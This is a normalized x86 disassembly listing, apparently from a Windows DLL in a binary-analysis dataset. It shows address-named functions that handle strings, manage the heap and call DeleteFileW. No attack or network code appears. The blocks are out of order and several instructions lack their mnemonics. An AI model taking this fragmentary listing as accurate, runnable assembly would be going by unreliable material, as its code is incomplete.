lea edx [ ebp - 0x94 ]
mov eax 0xe1
jmp r-xdata
lea edx [ ebp - 0xa8 ]
mov eax 0xd0
call sub_10053240
mov esi [ ebp - 0xb4 ]
push edx
lea eax [ ebp - 0xac ]
push eax
push ebx
call sub_10038760
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xb4 ] eax
mov ecx [ ebp - 0xb4 ]
push ecx
call [ SysFreeString@IAT ]
lea edx [ ebp - 0x1c ]
mov eax 0xdb
call sub_10053240
mov esi [ edi + 0xc ]
push edx
lea eax [ ebp - 0xac ]
push eax
push ebx
call sub_10038760
test eax eax
je r-xdata
lea edx [ ebp - 0x8c ]
mov eax 0x12f
call sub_10053240
mov ecx [ ebp - 0xc8 ]
mov eax [ ecx ]
mov edx [ eax ]
mov edx [ edx + 0x54 ]
lea ecx [ ebp - 0xc0 ]
push ecx
mov ecx [ ebp - 0xbc ]
push ecx
push eax
call edx
mov eax [ ebp - 0xc0 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0x48
jmp r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x11d
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xc0 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xac ]
test eax eax
je r-xdata
sub_1004b2a0
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0xc ]
cmp ecx 0x1
jne r-xdata
cmp [ eax + 0x14 ] 0x8
jb r-xdata
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov edx [ ebp + 0x8 ]
push edi
lea edi [ eax + edx * 2 ]
test ecx ecx
je r-xdata
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov dx [ ebp + 0x10 ]
mov [ eax + ecx * 2 ] dx
pop ebp
retn 0xc
mov eax [ eax ]
pop edi
pop ebp
retn 0xc
mov eax [ ebp + 0x10 ]
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
shr ecx 0x1
[ edi ]
adc ecx ecx
[ edi ]
sub_1004b2f2
push 0x80
mov eax sub_1008535c
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x18 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8c ] eax
mov al [ ebp + 0x1c ]
mov [ ebp - 0x7c ] al
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp + 0x2c ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x30 ]
mov [ ebp - 0x50 ] eax
lea eax [ ebp - 0x84 ]
push eax
mov ecx edi
call sub_10013950
and [ ebp - 0x4 ] 0x0
push eax
call sub_100188c2
or [ ebp - 0x4 ] 0xffffffff
pop ecx
mov ebx eax
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x68 ] ebx
call sub_10034a80
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
call sub_1000ff3d
mov eax [ ebx ]
mov ecx ebx
mov [ ebp - 0x4 ] 0x1
call [ eax + 0x8 ]
xor ebx ebx
mov [ ebp - 0x80 ] al
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
mov al [ esi ]
mov [ ebp - 0x4 ] 0x2
cmp al 0x2b
je r-xdata
mov [ ebp - 0x78 ] 0x1
mov [ ebp - 0x78 ] ebx
cmp al 0x2d
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
mov [ ebp - 0x58 ] ebx
call sub_1002f11b
mov eax [ eax ]
push [ ebp - 0x50 ]
mov al [ eax ]
push 0x65
push esi
mov [ ebp - 0x60 ] al
mov [ ebp - 0x5f ] 0x65
call sub_1007f360
push [ ebp - 0x50 ]
mov [ ebp - 0x70 ] eax
movsx eax [ ebp - 0x60 ]
push eax
push esi
call sub_1007f360
add esp 0x18
mov [ ebp - 0x4c ] eax
cmp eax ebx
jne r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x58 ]
add eax [ ebp - 0x50 ]
mov ecx [ edi + 0x20 ]
add eax [ ebp - 0x64 ]
add eax [ ebp - 0x5c ]
cmp [ edi + 0x24 ] ebx
jl r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
mov [ ebp - 0x4c ] ebx
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
movsx eax [ ebp - 0x60 ]
push [ ebp - 0x50 ]
push eax
push esi
call sub_1007f360
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax 0x100
jne r-xdata
cmp ecx eax
jbe r-xdata
cmp ecx ebx
jbe r-xdata
push [ ebp - 0x50 ]
lea ecx [ ebp - 0x2c ]
push esi
call sub_1002e070
mov eax [ ebp - 0x70 ]
cmp eax ebx
jne r-xdata
push [ ebp - 0x50 ]
push 0x65
push esi
call sub_1007f360
add esp 0xc
cmp eax ebx
je r-xdata
push [ ebp - 0x80 ]
sub eax esi
lea ebx [ eax + 0x1 ]
lea eax [ ebx - 0x1 ]
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x74 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x54 ]
call sub_10001ca2
mov ecx [ eax ]
push [ ebp - 0x5c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
push 0x30
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x74 ]
push eax
push [ ebp - 0x54 ]
call sub_10007c43
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x68 ]
mov [ ebp + 0x14 ] eax
mov eax [ ecx ]
add esp 0x34
call [ eax + 0x4 ]
mov [ ebp - 0x68 ] al
mov eax [ ebp + 0x10 ]
push [ ebp - 0x68 ]
mov [ ebp - 0x88 ] eax
mov eax [ ebp + 0x14 ]
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x84 ] eax
call sub_100030fa
push [ ebp - 0x64 ]
mov ecx [ ebp - 0x84 ]
mov eax [ ebp - 0x88 ]
push 0x30
push ecx
push eax
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ ebp - 0x54 ]
mov [ ebp + 0x14 ] ecx
call sub_10007c43
mov ecx [ eax ]
sub [ ebp - 0x50 ] ebx
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
add esi ebx
mov [ ebp + 0x14 ] eax
xor ebx ebx
push [ ebp - 0x4c ]
lea eax [ ebp - 0x74 ]
push [ ebp - 0x7c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x54 ]
call sub_10007c43
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4c ] ebx
mov [ ebp + 0x14 ] eax
add esp 0x18
cmp [ ebp - 0x78 ] ebx
jbe r-xdata
sub ecx eax
mov [ ebp - 0x4c ] ecx
jmp r-xdata
cmp [ ebp - 0x4c ] ebx
jne r-xdata
push 0x30
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x2c ]
call sub_1004ca10
jmp r-xdata
push [ ebp - 0x80 ]
lea eax [ ebp - 0x6c ]
push [ ebp - 0x50 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x54 ]
call sub_10001ca2
mov ecx [ eax ]
push [ ebp - 0x58 ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
push 0x30
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x74 ]
push eax
push [ ebp - 0x54 ]
call sub_10007c43
mov ecx [ eax ]
push [ ebp - 0x4c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push [ ebp - 0x7c ]
mov [ ebp + 0x14 ] eax
push eax
push ecx
push [ ebp - 0x8c ]
mov [ edi + 0x20 ] ebx
push [ ebp - 0x54 ]
mov [ edi + 0x24 ] ebx
call sub_10007c43
add esp 0x4c
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1002c8c0
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1002c8c0
mov eax [ ebp - 0x8c ]
call sub_1004642f
retn
push [ ebp - 0x80 ]
sub eax esi
lea ebx [ eax + 0x1 ]
lea eax [ ebx - 0x1 ]
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x6c ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x54 ]
call sub_10001ca2
mov ecx [ eax ]
push [ ebp - 0x58 ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
push 0x30
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
push eax
push [ ebp - 0x54 ]
call sub_10007c43
mov ecx [ eax ]
and [ ebp - 0x58 ] 0x0
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x34
test [ edi + 0x14 ] 0x4
mov [ ebp + 0x14 ] ecx
mov ecx r--data
jne r-xdata
push 0x1
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x74 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x54 ]
call sub_10069e87
mov ecx [ eax ]
add esp 0x18
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
inc esi
dec [ ebp - 0x50 ]
mov [ ebp + 0x14 ] eax
mov eax [ edi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
push 0x30
push [ ebp - 0x58 ]
sub eax esi
push eax
lea ecx [ ebp - 0x2c ]
call sub_10050540
push 0x30
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x2c ]
call sub_1004ca10
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x5c ] ebx
push 0x30
lea ecx [ ebp - 0x2c ]
cmp [ ebp - 0x4c ] ebx
jne r-xdata
push 0x1
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
push eax
push [ ebp - 0x54 ]
call sub_10069e87
mov ecx [ eax ]
sub [ ebp - 0x50 ] ebx
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
add esi ebx
mov [ ebp + 0x14 ] eax
xor ebx ebx
mov ecx r--data
mov ebx [ ebp - 0x4c ]
push [ ebp - 0x64 ]
sub ebx esi
lea eax [ ebx + 0x1 ]
push eax
call sub_10050540
push 0x30
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x2c ]
push ebx
call sub_10050540
and [ ebp - 0x64 ] 0x0
xor ebx ebx
push [ ebp - 0x5c ]
call sub_1004ca10
jmp r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
lea esi [ ebp - 0x48 ]
cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
mov [ ebp - 0x5c ] ebx
jae r-xdata
lea ecx [ ebp - 0x60 ]
push ecx
push eax
call sub_1007f580
pop ecx
pop ecx
mov [ ebp - 0x4c ] eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov al [ esi ]
cmp al 0x7f
jne r-xdata
test al al
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov esi [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x4c ]
sub ecx [ ebp - 0x78 ]
movsx eax al
cmp eax ecx
jae r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x50 ] eax
lea esi [ ebp - 0x2c ]
sub [ ebp - 0x4c ] eax
push ebx
push 0x1
push [ ebp - 0x4c ]
lea ecx [ ebp - 0x2c ]
call sub_10050540
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov esi eax
sub_1004b790
mov eax [ edi + 0x4 ]
dec [ eax ]
jne r-xdata
retn
push ebx
mov ebx [ HeapFree@IAT ]
push esi
mov esi [ edi ]
test esi esi
je r-xdata
mov eax [ edi + 0x4 ]
mov [ edi ] 0x0
test eax eax
je r-xdata
mov eax esi
call sub_1001f5f0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call ebx
pop esi
mov [ edi + 0x4 ] 0x0
pop ebx
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call ebx
sub_1004b7db
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x14 ]
lea ecx [ ebp + 0xc ]
call sub_1003c746
dec [ ebp + 0x18 ]
jne r-xdata
sub_1004b810
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
mov edx [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebx + 0x14 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x20 ]
push ecx
push edx
push eax
push r--data
lea eax [ esp + 0x20 ]
push eax
push esi
call sub_10069d50
add esp 0x10
push eax
lea ecx [ esp + 0x24 ]
push 0x40
push ecx
call sub_1005c1c5
mov ecx [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x18 ]
lea edx [ esp + 0x30 ]
push edx
mov edx [ ebp + 0xc ]
push eax
push ebx
push ecx
push edx
push edi
push esi
call sub_100149a0
mov ecx [ esp + 0x90 ]
add esp 0x34
mov eax edi
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x1c
sub_1004b891
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_1006299d
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_10046ed7
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_1004b913
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_10041486
pop ecx
test eax eax
je r-xdata
push esi
call sub_10083787
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_10041a47
push eax
call sub_100459f0
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_1004b960
mov ecx [ eax ]
push edi
push ecx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ esi + 0x10 ]
push r--data
xor edi edi
mov ecx esi
call sub_1001a2f0
pop edi
test eax eax
je r-xdata
retn
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push eax
call [ DeleteFileW@IAT ]
push 0x0
push r--data
mov ecx esi
call sub_1005ddc0
sub_1004b9ab
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10048ac0
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
pop ecx
sub_1004b9e0
push ebp
mov ebp esp
push 0xffffffff
push sub_10089971
mov eax [ fs : 0x0 ]
push eax
sub esp 0x350
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push 0x208
xor edi edi
lea ecx [ ebp - 0x2ec ]
push edi
push ecx
mov [ ebp - 0x358 ] eax
call sub_1007f940
add esp 0xc
lea ecx [ ebp - 0x2ec ]
call sub_10036cc0
mov esi eax
cmp esi edi
je r-xdata
push 0x144
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x344 ] eax
mov [ ebp - 0x4 ] 0x2
cmp eax edi
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0xfe
call sub_10045930
lea edx [ ebp - 0x324 ]
push esi
push edx
call sub_1005f2b0
push eax
lea edx [ ebp - 0x5c ]
lea esi [ ebp - 0x308 ]
mov [ ebp - 0x4 ] edi
call sub_1005bbc0
add esp 0xc
mov edx eax
lea ecx [ edi + 0x13 ]
mov [ ebp - 0x4 ] 0x1
call sub_100205a0
mov esi 0x8
cmp [ ebp - 0x2f4 ] esi
jb r-xdata
xor eax eax
push eax
call sub_10055110
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x2f4 ] 0x7
mov [ ebp - 0x2f8 ] edi
mov [ ebp - 0x308 ] cx
cmp [ ebp - 0x310 ] esi
jb r-xdata
mov eax [ ebp - 0x308 ]
push eax
call sub_100187af
add esp 0x4
lea edi [ ebp - 0x344 ]
call sub_1005a1d0
mov esi eax
xor edi edi
cmp esi edi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x348 ]
cmp esi edi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
lea ecx [ ebp - 0x34c ]
mov [ ebp - 0x34c ] edi
mov [ ebp - 0x348 ] edi
call sub_10023120
mov ebx 0x3
mov [ ebp - 0x4 ] ebx
mov esi [ ebp - 0x34c ]
cmp esi edi
jne r-xdata
mov eax 0x1
jmp r-xdata
mov edx [ ebp - 0x324 ]
push edx
call sub_100187af
add esp 0x4
lea ecx [ ebp - 0x2ec ]
push ecx
lea ecx [ ebp - 0x34c ]
mov [ ebp - 0x344 ] edi
call sub_1000b470
mov esi eax
cmp esi edi
je r-xdata
lea edx [ ebp - 0x58 ]
lea eax [ edi + 0x17 ]
call sub_10045930
lea eax [ ebp - 0x324 ]
push esi
push eax
call sub_1005f2b0
push eax
lea edx [ ebp - 0x58 ]
lea esi [ ebp - 0x308 ]
mov [ ebp - 0x4 ] 0x4
call sub_1005bbc0
add esp 0xc
mov edx eax
lea ecx [ edi + 0x13 ]
mov [ ebp - 0x4 ] 0x5
call sub_100205a0
mov esi 0x8
cmp [ ebp - 0x2f4 ] esi
jb r-xdata
mov eax 0x2
jmp r-xdata
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ebp - 0x34c ]
call sub_1000aaa0
mov esi eax
test esi esi
je r-xdata
lea edx [ ebp - 0xac ]
mov eax 0xa8
call sub_10045930
lea edx [ ebp - 0x308 ]
push esi
push edx
call sub_1005f2b0
push eax
lea edx [ ebp - 0xac ]
lea esi [ ebp - 0x324 ]
mov [ ebp - 0x4 ] 0x6
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0x13
mov [ ebp - 0x4 ] 0x7
call sub_100205a0
mov ecx esi
call sub_10019100
lea ecx [ ebp - 0x308 ]
mov [ ebp - 0x4 ] bl
call sub_10019100
mov [ ebp - 0x344 ] 0x4
xor edx edx
mov [ ebp - 0x2f4 ] 0x7
mov [ ebp - 0x2f8 ] edi
mov [ ebp - 0x308 ] dx
cmp [ ebp - 0x310 ] esi
jb r-xdata
mov ecx [ ebp - 0x308 ]
push ecx
call sub_100187af
add esp 0x4
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
lea eax [ ebx + 0x12c ]
mov ebx [ ebp - 0x358 ]
call sub_1001f480
mov edi eax
mov esi [ edi ]
test esi esi
jne r-xdata
lea edx [ ebp - 0xac ]
mov eax 0x76
call sub_10045930
lea eax [ ebp - 0x308 ]
push esi
push eax
call sub_1005f2b0
push eax
lea edx [ ebp - 0xac ]
lea esi [ ebp - 0x324 ]
mov [ ebp - 0x4 ] 0x8
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0x13
mov [ ebp - 0x4 ] 0x9
call sub_100205a0
mov ecx esi
call sub_10019100
lea ecx [ ebp - 0x308 ]
mov [ ebp - 0x4 ] 0x3
call sub_10019100
mov [ ebp - 0x344 ] 0x5
jmp r-xdata
mov eax [ ebp - 0x350 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0x5c
call sub_10045930
lea edx [ ebp - 0xc8 ]
push esi
push edx
call sub_1005f2b0
push eax
lea edx [ ebp - 0xa4 ]
lea esi [ ebp - 0x340 ]
mov [ ebp - 0x4 ] 0x11
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0x13
mov [ ebp - 0x4 ] 0x12
call sub_100205a0
mov ecx esi
call sub_10019100
lea ecx [ ebp - 0xc8 ]
call sub_10019100
mov [ ebp - 0x344 ] 0xa
lea eax [ ebp - 0x34c ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10006f30
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x324 ]
push eax
call sub_100187af
add esp 0x4
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
call sub_1006eeb0
push 0x58
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0xe4 ]
mov eax 0x14b
call sub_10045930
mov ecx edx
push ecx
lea ecx [ ebp - 0x324 ]
call sub_10054d00
lea edx [ ebp - 0x324 ]
lea ecx [ esi + 0x13 ]
mov [ ebp - 0x4 ] 0xa
call sub_100205a0
lea ecx [ ebp - 0x324 ]
mov [ ebp - 0x4 ] 0x3
call sub_10019100
mov [ ebp - 0x344 ] 0x6
jmp r-xdata
mov esi [ ebp - 0x34c ]
call sub_10007720
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0x34c ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10006f30
mov eax [ ebp - 0x344 ]
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor eax eax
mov esi eax
call sub_1001b6d0
jmp r-xdata
lea edi [ ebp - 0x354 ]
lea ecx [ ebp - 0x350 ]
call sub_10014c90
mov esi eax
test esi esi
je r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0xef
call sub_10045930
lea eax [ ebp - 0x308 ]
push esi
push eax
call sub_1005f2b0
push eax
lea edx [ ebp - 0xa4 ]
lea esi [ ebp - 0x324 ]
mov [ ebp - 0x4 ] 0xb
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0x13
mov [ ebp - 0x4 ] 0xc
call sub_100205a0
mov ecx esi
call sub_10019100
lea ecx [ ebp - 0x308 ]
mov [ ebp - 0x4 ] 0x3
call sub_10019100
mov [ ebp - 0x344 ] 0x7
jmp r-xdata
mov ebx [ ebp - 0x34c ]
mov [ edi ] eax
xor eax eax
lea edx [ ebp - 0x350 ]
push edx
lea ecx [ ebp - 0x354 ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x354 ] eax
call sub_100195d0
mov esi eax
test esi esi
je r-xdata
mov edx [ ebp - 0x354 ]
mov eax [ ebp - 0x350 ]
push edx
push eax
lea eax [ ebp - 0x2ec ]
call sub_10005c30
mov esi eax
add esp 0x8
test esi esi
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0x139
call sub_10045930
lea ecx [ ebp - 0x308 ]
push esi
push ecx
call sub_1005f2b0
push eax
lea edx [ ebp - 0x5c ]
lea esi [ ebp - 0x324 ]
mov [ ebp - 0x4 ] 0xd
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0x13
mov [ ebp - 0x4 ] 0xe
call sub_100205a0
mov ecx esi
call sub_10019100
lea ecx [ ebp - 0x308 ]
mov [ ebp - 0x4 ] 0x3
call sub_10019100
mov [ ebp - 0x344 ] 0x8
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0x5a
call sub_10045930
lea ecx [ ebp - 0x308 ]
push esi
push ecx
call sub_1005f2b0
push eax
lea edx [ ebp - 0x5c ]
lea esi [ ebp - 0x324 ]
mov [ ebp - 0x4 ] 0xf
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0x13
mov [ ebp - 0x4 ] 0x10
call sub_100205a0
mov ecx esi
call sub_10019100
lea ecx [ ebp - 0x308 ]
call sub_10019100
lea eax [ ebp - 0x34c ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10006f30
mov eax 0x9
jmp r-xdata
sub_1004c030
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0xc ]
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax ecx
jb r-xdata
push r--data
call sub_1002d84e
sub eax ecx
cmp eax ebx
jae r-xdata
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ebx eax
test ebx ebx
je r-xdata
push r--data
call sub_1000831a
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push edi
lea edi [ eax + ebx ]
mov [ ebp - 0x4 ] edi
cmp edi 0x7ffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_1000831a
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_10041880
test edi edi
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x8
jb r-xdata
pop edi
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
xor edx edx
pop edi
mov [ eax ] dx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ esi ]
xor edx edx
pop edi
mov [ eax ] dx
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
mov edx 0x8
cmp [ eax + 0x14 ] edx
jb r-xdata
mov eax [ ebp + 0xc ]
lea edx [ eax + ebx ]
test eax eax
jne r-xdata
mov edx [ esi + 0x10 ]
push edx
lea edi [ ebx + ebx ]
push ecx
add eax edi
push eax
call sub_1002c6d0
mov eax [ ebp + 0x8 ]
add esp 0xc
cmp esi eax
jne r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov edx eax
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] edx
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
xor edx edx
mov [ eax + ecx * 2 ] dx
mov eax [ esi ]
xor edx edx
pop edi
mov [ eax + ecx * 2 ] dx
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp + 0xc ]
push edi
lea ecx [ ecx + edx * 2 ]
push ecx
push eax
call sub_1007f5d0
push ebx
lea ecx [ ecx + edx * 2 ]
mov eax esi
push ecx
push eax
call sub_1002c6d0
jmp r-xdata
mov eax [ esi ]
push ebx
lea ecx [ ecx + edx * 2 ]
push ecx
push eax
call sub_1002c6d0
jmp r-xdata
cmp eax 0x8
jb r-xdata
mov ecx [ ebp - 0x4 ]
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] ecx
jb r-xdata
sub_1004c1a2
push 0x34
mov eax sub_100852df
call sub_1003fae8
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
movzx ecx [ edi ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0xc ]
xor esi esi
xor edx edx
mov [ ebp - 0x40 ] eax
cmp cx si
je r-xdata
push esi
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] 0x0
call sub_100405c0
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x3c ] 0xfffffffe
mov [ ebp - 0x34 ] 0x1
mov eax ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1002c8c0
mov eax [ ebp - 0x3c ]
call sub_1004642f
retn
movzx eax [ edi + ebx * 2 ]
test ax ax
je r-xdata
inc edx
movzx eax [ edi + edx * 2 ]
cmp ax si
jne r-xdata
inc [ ebp + 0x10 ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
movzx ecx [ edi ]
cmp ax cx
jne r-xdata
cmp [ eax + esi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
inc ebx
